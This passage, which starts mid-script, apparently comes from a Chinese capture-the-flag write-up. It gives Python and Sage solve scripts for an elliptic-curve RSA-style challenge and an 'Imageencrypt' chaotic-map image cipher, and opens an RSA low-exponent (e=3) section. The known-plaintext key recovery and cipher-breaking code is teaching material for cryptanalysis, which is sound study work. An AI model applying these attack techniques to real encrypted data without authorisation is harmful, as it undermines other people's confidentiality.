class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span></span><br><span class="line"><span class="comment"># y^2==（x^3+b）%n</span></span><br><span class="line">b = (y ^ <span class="number">2</span> - x ^ <span class="number">3</span>) % n</span><br><span class="line"><span class="comment"># b=80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421103469394495274706241578726021598690355239783781433785479293793926265140251884444575671410967573946453503486277025286699273827984004452338</span></span><br><span class="line">phi = (p + <span class="number">1</span>) * (q + <span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">C = E([x, y])</span><br><span class="line">G = d * C</span><br><span class="line"><span class="built_in">print</span>(G)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">1500537458076802315061673741609048809282155574</span>)+long_to_bytes(<span class="number">293348288331056197202496342835702240774641366909</span>))</span><br></pre></td></tr></table></figure>
<h3 id="Imageencrypt"><a href="#Imageencrypt" class="headerlink" title="Imageencrypt"></a>Imageencrypt</h3><p>用testimage爆破key，排列组合试一下推出ch，然后求seq，再求x，求r，再求x0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">testimage=[<span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>, <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>, <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>, <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>, <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>, <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span>]</span><br><span class="line">enc_testimag=[<span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>, <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">144</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>, <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">207</span>, <span class="number">131</span>, <span class="number">57</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">211</span>, <span class="number">21</span>, <span class="number">45</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">58</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">97</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">216</span>, <span class="number">74</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">165</span>, <span class="number">198</span>, <span class="number">72</span>, <span class="number">150</span>, <span class="number">94</span>, <span class="number">7</span>, <span class="number">177</span>, <span class="number">46</span>, <span class="number">226</span>, <span class="number">252</span>, <span class="number">247</span>, <span class="number">79</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">106</span>, <span class="number">236</span>, <span class="number">47</span>, <span class="number">145</span>, <span class="number">170</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">101</span>, <span class="number">14</span>, <span class="number">152</span>, <span class="number">131</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">168</span>, <span class="number">99</span>, <span class="number">115</span>, <span class="number">27</span>, <span class="number">220</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">170</span>, <span class="number">107</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">129</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">217</span>, <span class="number">222</span>, <span class="number">36</span>, <span class="number">15</span>, <span class="number">217</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">192</span>, <span class="number">113</span>, <span class="number">230</span>, <span class="number">129</span>, <span class="number">196</span>, <span class="number">13</span>, <span class="number">247</span>, <span class="number">148</span>, <span class="number">228</span>, <span class="number">225</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">133</span>, <span class="number">132</span>, <span class="number">238</span>, <span class="number">236</span>, <span class="number">127</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">141</span>, <span class="number">114</span>, <span class="number">150</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">250</span>, <span class="number">141</span>, <span class="number">53</span>, <span class="number">114</span>, <span class="number">16</span>, <span class="number">198</span>, <span class="number">70</span>, <span class="number">133</span>, <span class="number">17</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">136</span>, <span class="number">73</span>, <span class="number">236</span>, <span class="number">78</span>, <span class="number">188</span>, <span class="number">150</span>, <span class="number">239</span>, <span class="number">58</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">11</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">167</span>, <span class="number">137</span>, <span class="number">188</span>, <span class="number">55</span>, <span class="number">195</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">245</span>, <span class="number">92</span>, <span class="number">160</span>, <span class="number">213</span>, <span class="number">254</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">69</span>, <span class="number">2</span>, <span class="number">140</span>, <span class="number">143</span>, <span class="number">155</span>, <span class="number">127</span>, <span class="number">236</span>, <span class="number">179</span>, <span class="number">199</span>, <span class="number">168</span>, <span class="number">35</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">174</span>]</span><br><span class="line">enc_flagimag=[<span class="number">198</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">3</span>, <span class="number">152</span>, <span class="number">139</span>, <span class="number">131</span>, <span class="number">84</span>, <span class="number">181</span>, <span class="number">180</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">192</span>, <span class="number">25</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">136</span>, <span class="number">107</span>, <span class="number">190</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">238</span>, <span class="number">117</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">116</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">214</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">209</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">196</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">225</span>, <span class="number">214</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">231</span>, <span class="number">204</span>, <span class="number">150</span>, <span class="number">204</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">142</span>, <span class="number">213</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">166</span>, <span class="number">65</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">189</span>, <span class="number">148</span>, <span class="number">38</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">31</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">86</span>, <span class="number">188</span>, <span class="number">86</span>, <span class="number">233</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">7</span>, <span class="number">212</span>, <span class="number">234</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">102</span>, <span class="number">227</span>, <span class="number">96</span>, <span class="number">160</span>, <span class="number">67</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">210</span>, <span class="number">188</span>, <span class="number">84</span>, <span class="number">216</span>, <span class="number">215</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">233</span>, <span class="number">2</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">107</span>, <span class="number">251</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">94</span>, <span class="number">190</span>, <span class="number">185</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">29</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">208</span>, <span class="number">228</span>, <span class="number">252</span>, <span class="number">73</span>, <span class="number">198</span>, <span class="number">151</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">97</span>, <span class="number">138</span>, <span class="number">235</span>, <span class="number">21</span>, <span class="number">117</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">253</span>, <span class="number">80</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">184</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">82</span>, <span class="number">37</span>, <span class="number">140</span>, <span class="number">23</span>, <span class="number">143</span>, <span class="number">179</span>, <span class="number">53</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">213</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">248</span>, <span class="number">65</span>, <span class="number">60</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">48</span>, <span class="number">254</span>, <span class="number">251</span>, <span class="number">89</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">190</span>, <span class="number">66</span>, <span class="number">174</span>, <span class="number">97</span>, <span class="number">175</span>, <span class="number">210</span>, <span class="number">191</span>, <span class="number">66</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">173</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">231</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">44</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">137</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">223</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">215</span>, <span class="number">133</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">224</span>, <span class="number">195</span>, <span class="number">140</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">156</span>, <span class="number">221</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">9</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">225</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">119</span>, <span class="number">63</span>, <span class="number">160</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">199</span>, <span class="number">86</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">135</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">241</span>, <span class="number">49</span>, <span class="number">249</span>, <span class="number">182</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">155</span>, <span class="number">157</span>, <span class="number">61</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">195</span>, <span class="number">54</span>, <span class="number">139</span>, <span class="number">232</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">11</span>, <span class="number">233</span>, <span class="number">58</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">137</span>, <span class="number">83</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">96</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">237</span>, <span class="number">124</span>, <span class="number">177</span>, <span class="number">166</span>, <span class="number">161</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">112</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">192</span>, <span class="number">147</span>, <span class="number">5</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">174</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">16</span>, <span class="number">188</span>, <span class="number">103</span>, <span class="number">187</span>, <span class="number">11</span>, <span class="number">238</span>, <span class="number">182</span>, <span class="number">144</span>, <span class="number">4</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">30</span>, <span class="number">198</span>, <span class="number">220</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">5</span>, <span class="number">45</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x, r</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r * x * (<span class="number">3</span> - x), <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    keys.append(testimage[i] ^ enc_testimag[i])</span><br><span class="line">c = Counter(keys)</span><br><span class="line"><span class="comment">#print(c.most_common(4))</span></span><br><span class="line"><span class="keyword">for</span> key1, key2 <span class="keyword">in</span> itertools.product([<span class="number">86</span>, <span class="number">169</span>], [<span class="number">78</span>, <span class="number">177</span>]):</span><br><span class="line">    chs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        ch = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> enc_testimag[i]^testimage[i] == key1:</span><br><span class="line">            ch = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> enc_testimag[i]^testimage[i] == (~key1)&amp;<span class="number">0xff</span>:</span><br><span class="line">            ch = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> enc_testimag[i]^testimage[i] == key2:</span><br><span class="line">            ch = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> enc_testimag[i]^testimage[i] == (~key2)&amp;<span class="number">0xff</span>:</span><br><span class="line">            ch = <span class="number">3</span></span><br><span class="line">        chs.append(ch)</span><br><span class="line">    binch = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">bin</span>(ch)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> ch <span class="keyword">in</span> chs])</span><br><span class="line">    seqs = [<span class="built_in">int</span>(binch[i:i + <span class="number">16</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binch), <span class="number">16</span>)]</span><br><span class="line">    rs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(seqs)):</span><br><span class="line">        x2 = seqs[i] / <span class="number">22000</span></span><br><span class="line">        x1 = seqs[i - <span class="number">1</span>] / <span class="number">22000</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = x2 / (x1 * (<span class="number">3</span> - x1))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        rs.append(r)</span><br><span class="line"></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line">r = <span class="number">1.2</span></span><br><span class="line">seqs = [<span class="number">47909</span>, <span class="number">47275</span>, <span class="number">48284</span>, <span class="number">46656</span>, <span class="number">49226</span>, <span class="number">45038</span>, <span class="number">51495</span>, <span class="number">40740</span>, <span class="number">56131</span>, <span class="number">30213</span>, <span class="number">58976</span>, <span class="number">22593</span>, <span class="number">53493</span>, <span class="number">36492</span>, <span class="number">58734</span>, <span class="number">23276</span>,</span><br><span class="line">        <span class="number">54242</span>, <span class="number">34786</span>, <span class="number">59225</span>, <span class="number">21883</span>, <span class="number">52659</span>, <span class="number">38317</span>, <span class="number">57857</span>, <span class="number">25696</span>, <span class="number">56490</span>, <span class="number">29302</span>, <span class="number">58654</span>, <span class="number">23501</span>, <span class="number">54478</span>, <span class="number">34236</span>, <span class="number">59316</span>, <span class="number">21623</span>]</span><br><span class="line">tmp = [<span class="built_in">round</span>(seq / <span class="number">22000</span>, <span class="number">6</span>) <span class="keyword">for</span> seq <span class="keyword">in</span> seqs]</span><br><span class="line"></span><br><span class="line">v = <span class="built_in">round</span>(tmp[<span class="number">0</span>], <span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    tmpv = v - <span class="number">1000</span> * <span class="number">0.000001</span> + i * <span class="number">0.000001</span></span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(seqs)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(seqs[j] != <span class="built_in">int</span>(tmpv * <span class="number">22000</span>)):</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">        tmpv = generate(tmpv, r)</span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        <span class="built_in">print</span> (v - <span class="number">1000</span> * <span class="number">0.000001</span> + i * <span class="number">0.000001</span>)</span><br><span class="line"></span><br><span class="line">x = <span class="number">2.177698</span></span><br><span class="line">x0 = <span class="number">0.840264</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(seqs) - <span class="number">1</span>):</span><br><span class="line">    x = generate(x, r)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    x = generate(x, r)</span><br><span class="line">    seqs.append(<span class="built_in">int</span>(x * <span class="number">22000</span>))</span><br><span class="line">bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> seq <span class="keyword">in</span> seqs:</span><br><span class="line">    binx = <span class="built_in">bin</span>(seq)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binx) &lt; <span class="number">16</span>:</span><br><span class="line">        binx = <span class="string">&#x27;0&#x27;</span> * (<span class="number">16</span> - <span class="built_in">len</span>(binx)) + binx</span><br><span class="line">    bins += binx</span><br><span class="line">plain = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        index = <span class="number">16</span> * i + j</span><br><span class="line">        ch = <span class="built_in">int</span>(bins[<span class="number">2</span> * index:<span class="number">2</span> * index + <span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">        pix = enc_flagimag[index]</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">            pix =( pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">            pix = (~pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">            pix = (pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">            pix = (~pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">        plain.append(pix)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, plain))</span><br><span class="line"><span class="built_in">print</span> md5.new(data).hexdigest()</span><br></pre></td></tr></table></figure>
<h3 id="Rsa"><a href="#Rsa" class="headerlink" title="Rsa"></a>Rsa</h3><p>msg1:e=3，RSA的低加密指数攻击</p>
